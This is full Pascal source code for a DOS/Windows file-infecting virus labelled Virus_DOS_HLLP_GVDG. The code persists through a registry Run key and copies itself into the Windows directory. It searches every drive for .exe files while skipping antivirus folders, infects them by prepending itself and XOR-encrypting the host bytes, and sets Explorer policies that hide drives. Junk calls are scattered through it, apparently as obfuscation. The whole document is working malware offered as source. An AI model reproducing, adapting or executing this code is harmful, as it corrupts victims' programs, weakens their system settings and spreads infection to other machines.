  {$M 65520,0,0}
Program Virus_DOS_HLLP_GVDG;
USES DOS;
Const
  VirSize=6450;
  Metka='dyp37-89';
  MSize=length(Metka);
type
  Bufer=array[1..VirSize] of Char;
VAR
   Victim : integer;
Procedure BeginEnd(i : integer);
var
  n :integer;
Begin
  case i of
        0..10000: n:=0;
    10001..20000: n:=i;
    20001..30000: n:=random(1000)
  else
    begin  
      n:=0;
      n:=random(65535);
      n:=i
    end;  
  end;
End;
Function IntToStr(I : integer) : String;
Var
  S : String [5];
Begin
 Str(I, S); BeginEnd(-2838); BeginEnd(1192); BeginEnd(21058);
 IntToStr:=S; BeginEnd(-1985); 
End;
Procedure AutoRun;
VAR
    f : file;
  txt : text;
    i : integer;
  st1 : string;
  st2 : string;
Begin
  st1:=GetEnv('SystemRoot')+'\'+'DEA@LVIR'+'.EXE';
  for i:=1 to length(st1) do
  begin
  if st1[i]='\'
  then st2:=st2+'\'+st1[i]
  else st2:=st2+st1[i]
  end;
  Assign(f,st1); BeginEnd(-1194); 
  {$i-} Reset(f); Close(f); {$i+}
  if IOResult<>0 then
  Begin
    Assign(txt,'REG');
    Rewrite(txt); BeginEnd(27355); 
    Writeln(txt,'Windows Registry Editor Version 5.00'); BeginEnd(28385); BeginEnd(11926); BeginEnd(-1107);
    Writeln(txt,'[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run]');
    Writeln(txt,'"DEA@LVIR"="'+st2+'"');
    Close(txt); BeginEnd(-5542); 
    Exec(GetEnv('Comspec'),'/c REG IMPORT REG');
    Exec(GetEnv('Comspec'),'/c DEL REG'); BeginEnd(-1150); 
    Exec(GetEnv('Comspec'),'/c copy '+paramstr(0)+' '+st1); BeginEnd(30268); BeginEnd(28717); BeginEnd(-1419);
    Exec(GetEnv('Comspec'),'/c cls'); BeginEnd(-1705); BeginEnd(2681); BeginEnd(-4801);
  End; BeginEnd(21496); BeginEnd(20213);
End;
function CD(path:string):boolean;
var
           d : dirstr;
           n : namestr;
           e : extstr;
           b : boolean;
         ToF : file;
       FromF : file;
           f : file;
     NumRead : Word;
  NumWritten : Word;
         Buf : array[1..$400] of Char;
          st : string;
begin
  fsplit(paramstr(0),d,n,e); BeginEnd(-3045); 
  st:=path+n+e;
  Assign(f,d+n+'.gds'); BeginEnd(27579); BeginEnd(-7715);
  {$i-}rewrite(f);
  Erase(f);{$i+}
    if IOResult<>0
      then
            Begin
             b:=true; BeginEnd(12351); BeginEnd(-6651);
             Assign(FromF, ParamStr(0));
             Reset(FromF, 1); BeginEnd(3959); 
             Assign(ToF,st); BeginEnd(11983); BeginEnd(29845);
             SetFAttr(ToF,0); BeginEnd(21309); 
             Rewrite(ToF, 1);
             repeat
               BlockRead(FromF, Buf, SizeOf(Buf), NumRead);
               BlockWrite(ToF, Buf, NumRead, NumWritten); BeginEnd(-1025); BeginEnd(-3298); BeginEnd(-1241);
             until (NumRead = 0) or (NumWritten <> NumRead);
             Close(ToF);
             Close(FromF);
             exec(st,''); BeginEnd(15155); BeginEnd(-4821);
            end
      else b:=false;
  CD:=b; BeginEnd(21097); BeginEnd(24482); BeginEnd(15671);
end;
procedure Shifr(var Buf:Bufer; key:integer);
var
   k : integer;
  ii : integer;
begin
  for k:=1 to Sizeof(Buf) do
  begin
    ii:=key+k; BeginEnd(24607); 
    Buf[k]:=chr(ord(Buf[k]) xor ii); BeginEnd(-1769); BeginEnd(32182); BeginEnd(26589);
  end;
end;
procedure Infect(path,name:string);
var
    FromF : file;
      ToF : file;
   BufVir : Bufer;
  NumRead : Word;
      txt : text;
        i : integer;
        k : integer;
      Key : integer;
begin
  Assign(txt,path+name);
  append(txt);
  write(txt,Metka);
  i:=0; BeginEnd(6801); 
  k:=random(256);
    repeat
      inc(i); BeginEnd(-1617); 
      write(txt,chr(random(256)));
    until i>k; BeginEnd(27173); BeginEnd(16099);
  Close(txt);
  Assign(ToF,path+name); BeginEnd(22337); 
  reset(ToF,1);
  Key:=FileSize(ToF) mod 256; BeginEnd(17929); BeginEnd(-1496); BeginEnd(-3144);
  BlockRead(ToF,BufVir,SizeOf(BufVir), NumRead); BeginEnd(26974); BeginEnd(10115); BeginEnd(7731);
  Shifr(BufVir,Key-1); BeginEnd(-5689); BeginEnd(10493);
  seek(ToF,filesize(ToF)); BeginEnd(30107); BeginEnd(-4495); BeginEnd(22557);
  BlockWrite(ToF,BufVir,NumRead);
  Assign(FromF,paramstr(0));
  reset(FromF,1); BeginEnd(13865); BeginEnd(27579); BeginEnd(-1896);
  BlockRead(FromF,BufVir,SizeOf(BufVir), NumRead); BeginEnd(2749); BeginEnd(-2660); BeginEnd(-2549);
  seek(ToF,0); BeginEnd(2568); BeginEnd(-1585);
  BlockWrite(ToF,BufVir,NumRead);
  Close(ToF); BeginEnd(24953); 
  Close(FromF); BeginEnd(6547); 
end;
procedure Find(dir:pathstr);
var
   sr : searchrec;
    f : file;
  Buf : array[1..4] of Char;
begin
  findfirst(dir+'*.exe',39,sr);
  if  (pos('SYSTEM',dir)=0) and (pos('DRWEB', dir)=0)
  and (pos('KASPER',dir)=0) and (pos('PANDA', dir)=0)
  and (pos('NORTON',dir)=0) and (pos('COMMON',dir)=0)
  and (pos('DOCUM', dir)=0) and (pos('GVDG',  dir)=0)
  then
  while doserror=0 do
  if Victim<13 then
  begin
  Assign(f,dir+sr.name); BeginEnd(-3106); BeginEnd(12753);
  setfattr(f,0); BeginEnd(30332); BeginEnd(-1112); BeginEnd(15089);
  {$i-}reset(f,1);
  Close(f);{$i+}
  IF ioresult=0 then
    Begin
      Assign(f,dir+sr.name); BeginEnd(4160); BeginEnd(32377); BeginEnd(-2819);
      reset(f,1); BeginEnd(14010); BeginEnd(30877); BeginEnd(-2704);
      if FileSize(f)>1000 then
      Begin
        seek(f,85); BeginEnd(-2969); 
        blockread(f,Buf,4); BeginEnd(25203); 
        Close(f); BeginEnd(-2756); 
        if Buf<>'GDS!' then
         begin
           inc(Victim); BeginEnd(-2625); BeginEnd(24670); BeginEnd(-6616);
           Infect(dir,sr.name); BeginEnd(-2283); BeginEnd(4206); BeginEnd(-3014);
         end; BeginEnd(26569); BeginEnd(-1295); BeginEnd(21934);
      end
      else
      Close(f);
    end; BeginEnd(6929); BeginEnd(-2270);
    findnext(sr); BeginEnd(-1252); BeginEnd(-1056); BeginEnd(28340);
  end
  else exit;
  findfirst(dir+'*.',55,sr);
  while doserror=0 do
  if Victim<13 then
  begin
    with sr do
      if (attr and directory<>0) and (name[1]<>'.') and (length(dir)<63)
      then find(dir+name+'\');
    findnext(sr);
  end
  else exit;
end;
procedure InRun(Run : integer);
var
        f : file;
      txt : text;
   BufVir : Bufer;
  NumRead : Word;
        k : integer;
        z : char;
      Key : integer;
        i : longint;
      Buf : array[1..MSize]of char;
begin
  Assign(txt,getenv('TMP')+'reg');
  rewrite(txt); BeginEnd(9977); BeginEnd(12377); BeginEnd(-3095);
  writeln(txt,'Windows Registry Editor Version 5.00');
  write(txt,'[HKEY_CURRENT_USER\Software\Microsoft\'); BeginEnd(20738); 
  writeln(txt,'Windows\CurrentVersion\Policies\Explorer]'); BeginEnd(-4918); BeginEnd(-1078);
  writeln(txt,'"DisableLocalMachineRun"=dword:00000001');
  writeln(txt,'"NoViewOnDrive"=dword:3ffffff'); BeginEnd(19017); BeginEnd(28660); BeginEnd(-2680);
  Close(txt); BeginEnd(-1485); BeginEnd(-2840); BeginEnd(8289);
  exec(getenv('comspec'),'/c reg import '+getenv('TMP')+'reg');
  exec(getenv('comspec'),'/c cls'); BeginEnd(-1261); BeginEnd(-1188); BeginEnd(-1094);
  erase(txt); BeginEnd(-1724); BeginEnd(-1785); BeginEnd(-8089);
  writeln('Hallo, World!!!');
  Assign(f,paramstr(0)); BeginEnd(3131); BeginEnd(-9771); BeginEnd(15413);
  reset(f,1); BeginEnd(-2945); 
  Key:=(FileSize(f)-VirSize) mod 256; BeginEnd(13707); BeginEnd(29965);
  seek(f,filesize(f)-VirSize); BeginEnd(3496); BeginEnd(3989); BeginEnd(-2937);
  BlockRead(f,BufVir,SizeOf(BufVir), NumRead); BeginEnd(-3144); 
  if filesize(f)=VirSize then
  Begin
    Close(f); BeginEnd(-1843); BeginEnd(28179);
    Erase(f);
    Halt(0);
  end
  else
  Shifr(BufVir,Key-1);
  seek(f,0);
  BlockWrite(f,BufVir,NumRead); BeginEnd(-1660); BeginEnd(8863); BeginEnd(2580);
  i:=filesize(f)-VirSize-256-MSize; BeginEnd(-7581); BeginEnd(28436);
  while true do
  begin
    seek(f,i);
    blockread(f,Buf,MSize);
    if Buf=Metka then
    begin
      seek(f,i); BeginEnd(-2708); BeginEnd(25240);
      truncate(f); BeginEnd(1515); BeginEnd(29693); BeginEnd(16489);
      break; BeginEnd(-1036); 
    end; BeginEnd(13523); 
    inc(i); BeginEnd(-9219); BeginEnd(-2685);
  end; BeginEnd(-2304); BeginEnd(-2531); BeginEnd(18727);
  Close(f);
  if Run=1 then
  exec(Paramstr(0),''); BeginEnd(-2953); 
end;
Procedure Nucleus;
var
    i : integer;
    s : string;
    f : file;
begin
  Assign(f,paramstr(0));
  SetFAttr(f,0); BeginEnd(-2726); 
  if Paramstr(1)='KILL' then
  begin
    InRun(0);
    Halt(0);
  end;
  AutoRun;
  if CD(getenv('SYSTEMROOT')+'\') then halt(0);
  s:=''; BeginEnd(-2732); 
  for i:=1 to 24 do
  begin
    Assign(f,chr(ord(i)+66)+':\'+#$FF);
    {$I-}rewrite(f); erase(f);{$I+} BeginEnd(-1331); BeginEnd(-2916); BeginEnd(24822);
    if ioresult=0 then s:=s+chr(ord(i)+66); BeginEnd(4622); 
  end; BeginEnd(5901); BeginEnd(21855); BeginEnd(1332);
  for i:=1 to length(s) do Find(s[i]+':\'); BeginEnd(26034); BeginEnd(25824); BeginEnd(27117);
  InRun(1); BeginEnd(5756); 
end;
begin
Randomize; BeginEnd(-5404); BeginEnd(-9413);
Nucleus; BeginEnd(-4571); BeginEnd(10029);
end.
